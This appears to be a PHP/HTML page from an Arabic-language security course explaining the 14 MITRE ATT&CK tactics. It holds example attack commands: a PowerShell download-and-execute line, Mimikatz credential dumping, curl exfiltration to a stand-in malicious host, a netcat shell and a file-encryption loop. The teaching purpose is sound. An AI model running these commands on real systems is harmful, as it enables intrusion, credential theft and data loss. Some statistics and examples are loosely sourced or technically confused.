<?php
include('../conn.php');

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

include '../session_check.php';
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="المراحل الـ14 لإطار MITRE ATT&CK بالترتيب الكامل">
    <meta name="keywords" content="MITRE ATT&CK, مراحل الهجوم, الأمن السيبراني, تقنيات الهجوم">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title> ايطار MITRE ATT&CK</title>
    <style>
        :root {
            --primary-color: #084584;
            --secondary-color: #2980b9;
            --accent-color: #f39c12;
            --dark-color: #2c3e50;
            --light-color: #ecf0f1;
            --danger-color: #e74c3c;
            --success-color: #27ae60;
            --text-color: #333;
            --text-light: #555;
        }
        
        body {
            font-family: 'Tajawal', 'Cairo', sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            color: var(--text-color);
            direction: rtl;
            text-align: right;
            background-image: url('../img/background6.jpg');
            background-size: cover;
            background-position: center center;
            background-attachment: fixed;
            line-height: 1.8;
        }

        .title {
            font-size: 2.8rem;
            color: var(--primary-color);
            text-align: center;
            padding: 20px;
            margin: 12px auto 20px;
            position: relative;
            width: fit-content;
        }

        .title::after {
            content: "";
            position: absolute;
            bottom: 10px;
            right: 0;
            width: 70%;
            height: 3px;
            background: linear-gradient(to right, var(--secondary-color), transparent);
            border-radius: 3px;
        }

        .container {
            padding: 40px;
            max-width: 1200px;
            margin: 20px auto 50px;
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .container:hover {
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
            transform: translateY(-5px);
        }

        .section-title {
            font-size: 2rem;
            color: var(--secondary-color);
            margin-bottom: 30px;
            font-weight: 800;
            padding-bottom: 15px;
            border-bottom: 2px solid var(--secondary-color);
            position: relative;
        }

        .section-title::before {
            content: "";
            position: absolute;
            bottom: -2px;
            right: 0;
            width: 100px;
            height: 4px;
            background: var(--accent-color);
            border-radius: 2px;
        }

        .card {
            padding: 30px;
            margin: 30px 0;
            border-radius: 12px;
            background-color: rgba(250, 250, 250, 0.9);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
            border-left: 5px solid var(--secondary-color);
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }

        .card:hover {
            background-color: rgba(241, 241, 241, 0.95);
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
            transform: translateX(-10px);
        }

        .card::before {
            content: "";
            position: absolute;
            top: 0;
            right: 0;
            width: 5px;
            height: 0;
            background: var(--accent-color);
            transition: all 0.4s ease;
        }

        .card:hover::before {
            height: 100%;
        }

        .card-header {
            font-size: 1.6rem;
            font-weight: 700;
            color: var(--dark-color);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
        }

        .card-header i {
            margin-left: 10px;
            color: var(--secondary-color);
        }

        .tactic-number {
            background-color: var(--primary-color);
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-left: 15px;
            font-weight: bold;
        }

        .paragraph, .custom-ul {
            font-size: 1.1rem;
            color: var(--text-light);
            line-height: 1.9;
        }

        pre {
            background-color: var(--dark-color);
            color: #fff;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', Courier, monospace;
            font-size: 1rem;
            overflow-x: auto;
            white-space: pre-wrap;
            position: relative;
        }

        pre::before {
            content: "كود";
            position: absolute;
            top: 0;
            left: 0;
            background: var(--accent-color);
            color: white;
            padding: 2px 10px;
            font-size: 0.8rem;
            border-radius: 0 0 5px 0;
        }

        .example-box {
            background-color: var(--light-color);
            padding: 20px;
            margin-top: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
            border-right: 3px solid var(--accent-color);
        }

        .note {
            background-color: #fff3cd;
            padding: 20px;
            border-left: 5px solid var(--accent-color);
            margin: 25px 0;
            font-size: 1.1rem;
            border-radius: 8px;
            position: relative;
        }

        .note::before {
            content: "ملاحظة هامة";
            font-weight: bold;
            display: block;
            margin-bottom: 10px;
            color: var(--dark-color);
        }

        .warning {
            background-color: #f8d7da;
            border-left: 5px solid var(--danger-color);
        }

        .warning::before {
            content: "تحذير";
            color: var(--danger-color);
        }

        .img-tool {
            width: 70%;
            max-width: 800px;
            border-radius: 12px;
            margin: 30px auto;
            display: block;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease;
            border: 3px solid white;
        }

        .img-tool:hover {
            transform: scale(1.02);
        }

        .advantages .custom-ul {
            list-style-type: none;
            padding-right: 0;
        }

        .advantages .custom-li {
            font-size: 1.1rem;
            color: var(--text-light);
            padding: 10px 0;
            position: relative;
            padding-right: 30px;
        }

        .advantages .custom-li::before {
            content: "\f00c";
            font-family: "Font Awesome 6 Free";
            font-weight: 900;
            position: absolute;
            right: 0;
            color: var(--success-color);
        }

        .card a {
            color: var(--secondary-color);
            font-size: 1.1rem;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
        }

        .card a:hover {
            color: var(--primary-color);
            text-decoration: underline;
        }

        .card a i {
            margin-right: 5px;
        }

        .button {
            background-color: var(--secondary-color);
            color: #fff;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 1.1rem;
            text-align: center;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .button:hover {
            background-color: var(--primary-color);
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }

        .button i {
            margin-right: 8px;
        }

        .tactics-flow {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin: 40px 0;
        }

        .tactic-pill {
            background-color: var(--primary-color);
            color: white;
            padding: 10px 20px;
            border-radius: 50px;
            font-weight: bold;
            display: flex;
            align-items: center;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            transition: all 0.3s ease;
        }

        .tactic-pill:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
            background-color: var(--secondary-color);
        }

        .tactic-pill-number {
            background-color: white;
            color: var(--primary-color);
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: 10px;
            font-weight: bold;
        }

        @media screen and (max-width: 768px) {
            .title {
                font-size: 2rem;
            }
            
            .container {
                padding: 20px;
                margin: 10px auto 30px;
            }
            
            .section-title {
                font-size: 1.5rem;
            }
            
            .card {
                padding: 20px;
            }
            
            .img-tool {
                width: 100%;
            }
            
            .tactics-flow {
                flex-direction: column;
                align-items: center;
            }
            
            .tactic-pill {
                width: 100%;
                justify-content: flex-start;
            }
        }

        /* Animation */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            animation: fadeIn 0.6s ease forwards;
        }

        .card:nth-child(1) { animation-delay: 0.1s; }
        .card:nth-child(2) { animation-delay: 0.2s; }
        .card:nth-child(3) { animation-delay: 0.3s; }
        .card:nth-child(4) { animation-delay: 0.4s; }
        .card:nth-child(5) { animation-delay: 0.5s; }
        .card:nth-child(6) { animation-delay: 0.6s; }
        .card:nth-child(7) { animation-delay: 0.7s; }
        .card:nth-child(8) { animation-delay: 0.8s; }
        .card:nth-child(9) { animation-delay: 0.9s; }
        .card:nth-child(10) { animation-delay: 1.0s; }
        .card:nth-child(11) { animation-delay: 1.1s; }
        .card:nth-child(12) { animation-delay: 1.2s; }
        .card:nth-child(13) { animation-delay: 1.3s; }
        .card:nth-child(14) { animation-delay: 1.4s; }
    </style>
</head>
<body>
<?php
include('header-learn-home.php');
?>

<h1 class="title"><i class="fas fa-chess-knight"></i> المراحل الـ14 لـ MITRE ATT&CK</h1>

<div class="container">
    <!-- مقدمة -->
    <section>
        <h2 class="section-title"><i class="fas fa-info-circle"></i> نظرة عامة</h2>
        <div class="card">
            <p class="paragraph">إطار MITRE ATT&CK يصف 14 مرحلة (Tactic) رئيسية يمر بها المهاجمون أثناء تنفيذ الهجمات السيبرانية. هذه المراحل تمثل الأهداف التي يسعى المهاجم لتحقيقها، وكل مرحلة تحتوي على عشرات التقنيات (Techniques) المحددة.</p>
            
            <div class="note">
                <strong>ملاحظة:</strong> ليس بالضرورة أن يمر المهاجم بجميع هذه المراحل، وقد يتخطى بعضها أو يغير ترتيبها حسب طبيعة الهجوم والهدف.
            </div>
            
            <div class="tactics-flow">
                <div class="tactic-pill"><span class="tactic-pill-number">1</span> الاستكشاف</div>
                <div class="tactic-pill"><span class="tactic-pill-number">2</span> تطوير الموارد</div>
                <div class="tactic-pill"><span class="tactic-pill-number">3</span> الوصول الأولي</div>
                <div class="tactic-pill"><span class="tactic-pill-number">4</span> التنفيذ</div>
                <div class="tactic-pill"><span class="tactic-pill-number">5</span> الثبات</div>
                <div class="tactic-pill"><span class="tactic-pill-number">6</span> تصعيد الامتيازات</div>
                <div class="tactic-pill"><span class="tactic-pill-number">7</span> التهرب من الدفاعات</div>
                <div class="tactic-pill"><span class="tactic-pill-number">8</span> الوصول إلى بيانات الاعتماد</div>
                <div class="tactic-pill"><span class="tactic-pill-number">9</span> الاكتشاف</div>
                <div class="tactic-pill"><span class="tactic-pill-number">10</span> الحركة الجانبية</div>
                <div class="tactic-pill"><span class="tactic-pill-number">11</span> جمع البيانات</div>
                <div class="tactic-pill"><span class="tactic-pill-number">12</span> التهريب</div>
                <div class="tactic-pill"><span class="tactic-pill-number">13</span> التحكم والسيطرة</div>
                <div class="tactic-pill"><span class="tactic-pill-number">14</span> التأثير</div>
            </div>
            
            <img src="https://attack.mitre.org/mitreattack.png" alt="مصفوفة MITRE ATT&CK" class="img-tool">
        </div>
    </section>

    <!-- المراحل بالتفصيل -->
    <section>
        <h2 class="section-title"><i class="fas fa-list-ol"></i> المراحل بالتفصيل</h2>
        
        <!-- Reconnaissance -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">1</span>
                <i class="fas fa-search"></i> الاستكشاف (Reconnaissance)
            </div>
            <p class="paragraph">يجمع المهاجم المعلومات عن الهدف لتخطيط الهجوم. قد يشمل ذلك البحث عن معلومات عامة، مسح الشبكات، أو جمع بيانات الموظفين.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-tools"></i> تقنيات شائعة:</h4>
                <ul>
                    <li>جمع المعلومات من مصادر مفتوحة (OSINT)</li>
                    <li>مسح المنافذ والخدمات (Nmap)</li>
                    <li>البحث عن الثغرات المعروفة</li>
                    <li>جمع عناوين البريد الإلكتروني</li>
                </ul>
            </div>
            
            <pre>
# مثال استخدام Nmap لمسح الهدف
nmap -sV -O 192.168.1.1
            </pre>
            
            <div class="warning">
                <strong>تحذير:</strong> 92% من المهاجمين يقضون وقتًا في مرحلة الاستكشاف قبل الهجوم (تقرير Verizon 2023).
            </div>
        </div>
        
        <!-- Resource Development -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">2</span>
                <i class="fas fa-tools"></i> تطوير الموارد (Resource Development)
            </div>
            <p class="paragraph">يحصل المهاجم على الموارد اللازمة للهجوم مثل الخوادم، النطاقات، أو البرمجيات الخبيثة.</p>
            
            <ul class="custom-ul advantages">
                <li class="custom-li">شراء أو تطوير برمجيات خبيثة</li>
                <li class="custom-li">استئجار خوادم أو نطاقات للهجوم</li>
                <li class="custom-li">إنشاء حسابات مزيفة للتصيد</li>
                <li class="custom-li">سرقة أو شراء بيانات الاعتماد</li>
            </ul>
            
            <div class="note">
                <strong>مثال:</strong> استخدام منصات مثل GitHub لاستضافة البرمجيات الخبيثة أو Telegram لشراء بيانات الاعتماد المسروقة.
            </div>
        </div>
        
        <!-- Initial Access -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">3</span>
                <i class="fas fa-door-open"></i> الوصول الأولي (Initial Access)
            </div>
            <p class="paragraph">يتم في هذه المرحلة اختراق الحدود الدفاعية للهدف. تشمل الطرق الشائعة التصيد الاحتيالي، استغلال الثغرات، أو استخدام بيانات اعتماد مسروقة.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-chart-pie"></i> إحصائيات:</h4>
                <ul>
                    <li>94% من الهجمات تبدأ بالبريد الإلكتروني</li>
                    <li>62% تستغل ثغرات معروفة</li>
                    <li>45% تستخدم بيانات اعتماد مسروقة</li>
                </ul>
            </div>
            
            <pre>
# مثال رسالة تصيد احتيالي
Subject: مستعجل: تحديث كلمة المرور
From: الدعم الفني <support@company.com>
الرجاء النقر على الرابط لتحديث كلمة المرور: [رابط ضار]
            </pre>
        </div>
        
        <!-- Execution -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">4</span>
                <i class="fas fa-terminal"></i> التنفيذ (Execution)
            </div>
            <p class="paragraph">يحاول المهاجم تنفيذ أكواد أو أوامر على النظام المستهدف. يمكن أن يتم ذلك عبر واجهات سطر الأوامر، البرامج النصية، أو البرمجيات الخبيثة.</p>
            
            <pre>
# مثال استخدام PowerShell لتنفيذ برنامج ضار
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
            </pre>
            
            <div class="note">
                <strong>دفاع:</strong> تقييد استخدام PowerShell وتفعيل سجلات الأحداث يمكن أن يساعد في اكتشاف هذه النشاطات.
            </div>
        </div>
        
        <!-- Persistence -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">5</span>
                <i class="fas fa-anchor"></i> الثبات (Persistence)
            </div>
            <p class="paragraph">يحافظ المهاجم على وجوده في النظام بعد إعادة التشغيل أو محاولات الإزالة. يمكن تحقيق ذلك عبر إضافة مفاتيح تسجيل، مهام مجدولة، أو حسابات جديدة.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-code"></i> طرق الثبات الشائعة:</h4>
                <ul>
                    <li>إضافة إلى Startup folder</li>
                    <li>تعديل مفاتيح التسجيل (Registry)</li>
                    <li>إنشاء مهام مجدولة (Scheduled Tasks)</li>
                    <li>إضافة حسابات مستخدمين جديدة</li>
                </ul>
            </div>
            
            <pre>
# مثال إنشاء مهام مجدولة للثبات
schtasks /create /tn "Update Check" /tr "C:\malware.exe" /sc hourly /mo 1
            </pre>
        </div>
        
        <!-- Privilege Escalation -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">6</span>
                <i class="fas fa-user-shield"></i> تصعيد الامتيازات (Privilege Escalation)
            </div>
            <p class="paragraph">يسعى المهاجم لرفع مستوى صلاحياته على النظام المخترق للحصول على تحكم أكبر. يمكن تحقيق ذلك عبر استغلال الثغرات أو سرقة بيانات الاعتماد.</p>
            
            <img src="https://www.ired.team/images/privilege-escalation.png" alt="تصعيد الامتيازات" class="img-tool">
            
            <pre>
# مثال استخدام Mimikatz لسرقة بيانات الاعتماد
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
            </pre>
            
            <div class="warning">
                <strong>تحذير:</strong> 68% من الهجمات الناجحة تتطلب تصعيد الامتيازات لتحقيق أهدافها (تقرير CrowdStrike 2023).
            </div>
        </div>
        
        <!-- Defense Evasion -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">7</span>
                <i class="fas fa-user-ninja"></i> التهرب من الدفاعات (Defense Evasion)
            </div>
            <p class="paragraph">يحاول المهاجم تجنب الكشف من خلال تعطيل أدوات الأمان، تشويش الملفات، أو استخدام تقنيات التخفي.</p>
            
            <ul class="custom-ul advantages">
                <li class="custom-li">تعطيل برامج الحماية (Antivirus)</li>
                <li class="custom-li">التشويش (Obfuscation) وتشفير البرمجيات الخبيثة</li>
                <li class="custom-li">حذف السجلات (Logs)</li>
                <li class="custom-li">الوصول الشرعي (Living Off the Land)</li>
            </ul>
            
            <pre>
# مثال تشفير برنامج ضار باستخدام base64
python -c "import base64; print(base64.b64encode(b'malicious.exe'))"
            </pre>
        </div>
        
        <!-- Credential Access -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">8</span>
                <i class="fas fa-key"></i> الوصول إلى بيانات الاعتماد (Credential Access)
            </div>
            <p class="paragraph">يحاول المهاجم سرقة أسماء المستخدمين وكلمات المرور أو بيانات اعتماد أخرى لتوسيع نطاق اختراقه.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-tools"></i> تقنيات سرقة بيانات الاعتماد:</h4>
                <ol>
                    <li>Keylogging: تسجيل ضغطات لوحة المفاتيح</li>
                    <li>Credential Dumping: استخراج بيانات الاعتماد من الذاكرة</li>
                    <li>Brute Force: تخمين كلمات المرور</li>
                    <li>Phishing: خداع المستخدمين لإدخال بياناتهم</li>
                </ol>
            </div>
            
            <pre>
# مثال استخدام PowerShell لسرقة بيانات الاعتماد
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
            </pre>
        </div>
        
        <!-- Discovery -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">9</span>
                <i class="fas fa-binoculars"></i> الاكتشاف (Discovery)
            </div>
            <p class="paragraph">يستكشف المهاجم البيئة المستهدفة لفهم بنيتها وشبكتها وأنظمتها بشكل أفضل.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-network-wired"></i> أنشطة الاكتشاف الشائعة:</h4>
                <ul>
                    <li>اكتشاف الحسابات والامتيازات</li>
                    <li>مسح الشبكة الداخلية</li>
                    <li>اكتشاف الأنظمة والخدمات</li>
                    <li>جمع معلومات عن السياسات الأمنية</li>
                </ul>
            </div>
            
            <pre>
# مثال اكتشاف الحسابات المحلية
net user
            </pre>
        </div>
        
        <!-- Lateral Movement -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">10</span>
                <i class="fas fa-arrows-alt-h"></i> الحركة الجانبية (Lateral Movement)
            </div>
            <p class="paragraph">ينتقل المهاجم بين الأنظمة والأجهزة على الشبكة المستهدفة باستخدام بيانات الاعتماد المسروقة أو استغلال الثغرات.</p>
            
            <img src="https://www.cynet.com/wp-content/uploads/lateral-movement-attacks.png" alt="الحركة الجانبية" class="img-tool">
            
            <div class="note">
                <strong>ملاحظة:</strong> يستغرق المهاجمون في المتوسط 56 يومًا للانتقال بين الأنظمة قبل الاكتشاف (تقرير Mandiant 2023).
            </div>
            
            <pre>
# مثال استخدام RDP للحركة الجانبية
xfreerdp /v:192.168.1.100 /u:admin /p:password +compression /clipboard
            </pre>
        </div>
        
        <!-- Collection -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">11</span>
                <i class="fas fa-archive"></i> جمع البيانات (Collection)
            </div>
            <p class="paragraph">يجمع المهاجم البيانات الحساسة من الأنظمة المخترقة مثل الملفات، رسائل البريد الإلكتروني، أو قواعد البيانات.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-chart-pie"></i> إحصائيات:</h4>
                <ul>
                    <li>89% يجمعون ملفات Office</li>
                    <li>67% يسرقون قواعد البيانات</li>
                    <li>72% يجمعون رسائل البريد الإلكتروني</li>
                </ul>
            </div>
            
            <pre>
# مثال استخدام PowerShell لسرقة الملفات
Get-ChildItem -Path C:\Users\ -Include *.doc, *.pdf, *.xls -Recurse -Force | Copy-Item -Destination \\attacker\share
            </pre>
        </div>
        
        <!-- Exfiltration -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">12</span>
                <i class="fas fa-cloud-download-alt"></i> التهريب (Exfiltration)
            </div>
            <p class="paragraph">ينقل المهاجم البيانات المسروقة من الشبكة المستهدفة إلى خوادمه الخاصة. يتم ذلك غالبًا عبر قنوات مشفرة أو خدمات سحابية.</p>
            
            <ul class="custom-ul advantages">
                <li class="custom-li">FTP/HTTP: نقل البيانات عبر بروتوكولات الويب</li>
                <li class="custom-li">Cloud Storage: استخدام خدمات مثل Dropbox أو Google Drive</li>
                <li class="custom-li">DNS Tunneling: تهريب البيانات عبر استعلامات DNS</li>
                <li class="custom-li">Encrypted Channels: استخدام VPN أو Tor لإخفاء النشاط</li>
            </ul>
            
            <pre>
# مثال استخدام curl لتهريب البيانات
curl -X POST -F "file=@sensitive.docx" http://malicious.server/upload
            </pre>
        </div>
        
        <!-- Command and Control -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">13</span>
                <i class="fas fa-network-wired"></i> التحكم والسيطرة (Command and Control)
            </div>
            <p class="paragraph">ينشئ المهاجم قنوات اتصال مع الأنظمة المخترقة للحفاظ على السيطرة عليها وتلقي الأوامر.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-satellite-dish"></i> تقنيات C2 الشائعة:</h4>
                <ul>
                    <li>Web Protocols: HTTP/HTTPS</li>
                    <li>DNS: استعلامات DNS المزيفة</li>
                    <li>Social Media: استخدام منصات مثل Twitter أو Telegram</li>
                    <li>P2P: شبكات الند للند</li>
                </ul>
            </div>
            
            <pre>
# مثال إنشاء اتصال C2 باستخدام Netcat
nc -lvp 4444 -e /bin/bash
            </pre>
        </div>
        
        <!-- Impact -->
        <div class="card">
            <div class="card-header">
                <span class="tactic-number">14</span>
                <i class="fas fa-bomb"></i> التأثير (Impact)
            </div>
            <p class="paragraph">يؤثر المهاجم على توفر أو تكامل البيانات والأنظمة، مثل تشفير البيانات (Ransomware) أو تعطيل الخدمات.</p>
            
            <div class="example-box">
                <h4><i class="fas fa-exclamation-triangle"></i> تقنيات التأثير الشائعة:</h4>
                <ul>
                    <li>تشفير البيانات (Ransomware)</li>
                    <li>تدمير البيانات</li>
                    <li>تعطيل الخدمات (DoS)</li>
                    <li>تعديل البيانات</li>
                </ul>
            </div>
            
            <div class="warning">
                <strong>تحذير:</strong> زادت هجمات Ransomware بنسبة 105% في 2023 مقارنة بالعام السابق (تقرير SonicWall).
            </div>
            
            <pre>
# مثال تشفير الملفات باستخدام PowerShell
Get-ChildItem -Path C:\Data\ -Recurse | ForEach-Object { Encrypt-File $_ -Key $maliciousKey }
            </pre>
        </div>
    </section>

    <!-- خاتمة -->
    <section>
        <h2 class="section-title"><i class="fas fa-graduation-cap"></i> كيف تستخدم هذه المعرفة؟</h2>
        <div class="card">
            <div class="card-header"><i class="fas fa-shield-alt"></i> تطبيق MITRE ATT&CK للدفاع</div>
            <p class="paragraph">يمكن استخدام فهم هذه المراحل لتحسين الدفاعات الأمنية:</p>
            
            <ol style="font-size: 1.1rem; color: var(--text-light); padding-right: 20px;">
                <li style="padding: 8px 0;">رسم خرائط التهديدات بناءً على تقنيات ATT&CK</li>
                <li style="padding: 8px 0;">تحسين المراقبة الأمنية للكشف عن نشاطات كل مرحلة</li>
                <li style="padding: 8px 0;">تطوير ضوابط أمنية تستهدف تقنيات معينة</li>
                <li style="padding: 8px 0;">اختبار الدفاعات عبر محاكاة هجمات ATT&CK</li>
                <li style="padding: 8px 0;">تحليل الحوادث وتصنيفها حسب المصفوفة</li>
            </ol>
            
            <div style="text-align: center; margin-top: 30px;">
                <a href="https://attack.mitre.org/" class="button">
                    <i class="fas fa-external-link-alt"></i> الموقع الرسمي لـ MITRE ATT&CK
                </a>
                <a href="https://github.com/redcanaryco/atomic-red-team" class="button" style="background-color: var(--accent-color); margin-right: 15px;">
                    <i class="fas fa-atom"></i> Atomic Red Team
                </a>
            </div>
        </div>
    </section>
</div>

<script>
    // Simple animation on scroll
    document.addEventListener('DOMContentLoaded', function() {
        const cards = document.querySelectorAll('.card');
        
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.style.opacity = 1;
                    entry.target.style.transform = 'translateY(0)';
                }
            });
        }, {threshold: 0.1});
        
        cards.forEach(card => {
            card.style.opacity = 0;
            card.style.transform = 'translateY(20px)';
            card.style.transition = 'all 0.6s ease';
            observer.observe(card);
        });
    });
</script>
</body>
</html>